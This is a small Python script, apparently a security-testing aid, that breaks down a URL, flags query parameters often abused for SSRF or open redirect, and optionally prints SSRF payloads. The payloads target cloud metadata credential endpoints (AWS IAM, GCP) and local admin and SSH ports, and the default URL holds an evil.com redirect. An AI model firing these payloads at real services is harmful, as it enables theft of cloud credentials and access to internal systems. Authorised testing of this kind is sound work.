#!/usr/bin/env python3
"""
Subdomain & URL SSRF/Open-Redirect Parser
Author: Sameek Parajuli (https://github.com/Samik-Parajuli)
License: MIT
"""

import sys
import argparse
from urllib.parse import urlparse, parse_qs

SUSPICIOUS_PARAMS = {'url', 'redirect', 'dest', 'destination', 'next', 'target', 'callback', 'return', 'uri', 'path', 'feed'}

def parse_url(raw_url, generate_ssrf=False):
    parsed = urlparse(raw_url)
    hostname = parsed.hostname or ""
    subdomains = hostname.split('.')[:-2] if len(hostname.split('.')) > 2 else []
    query_params = parse_qs(parsed.query)

    print("=" * 60)
    print(f" [*] URL DECONSTRUCTION: {raw_url}")
    print("=" * 60)
    print(f"  Scheme / Protocol : {parsed.scheme}")
    print(f"  Hostname          : {hostname}")
    print(f"  Port              : {parsed.port or (443 if parsed.scheme == 'https' else 80)}")
    print(f"  Subdomain Chain   : {'.'.join(subdomains) if subdomains else '[NONE / APEX DOMAIN]'}")
    print(f"  Path              : {parsed.path or '/'}")
    print(f"  Fragment / Hash   : {parsed.fragment or '[NONE]'}")
    print("-" * 60)
    print("  PARSED QUERY PARAMETERS:")
    if query_params:
        for k, v in query_params.items():
            flag = "[!] RISKY (SSRF/Redirect)" if k.lower() in SUSPICIOUS_PARAMS else "[OK]"
            print(f"    {flag} {k} = {', '.join(v)}")
    else:
        print("    [None detected]")

    if generate_ssrf and query_params:
        print("\n" + "=" * 60)
        print(" [*] SSRF & CLOUD METADATA PAYLOAD MUTATIONS:")
        print("=" * 60)
        payloads = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1:8080/admin",
            "http://localhost:22"
        ]
        for p in payloads:
            for k in query_params:
                if k.lower() in SUSPICIOUS_PARAMS:
                    print(f"  -> {k} = {p}")

def main():
    parser = argparse.ArgumentParser(description="Subdomain & URL SSRF/Open-Redirect Parser")
    parser.add_argument("url", nargs="?", default="https://recon.dev.internal.target.com:8443/auth/callback?redirect=//evil.com&token=123#debug", help="Target URL")
    parser.add_argument("--ssrf-mutations", action="store_true", help="Generate cloud metadata SSRF payloads")
    args = parser.parse_args()

    parse_url(args.url, args.ssrf_mutations)

if __name__ == "__main__":
    main()
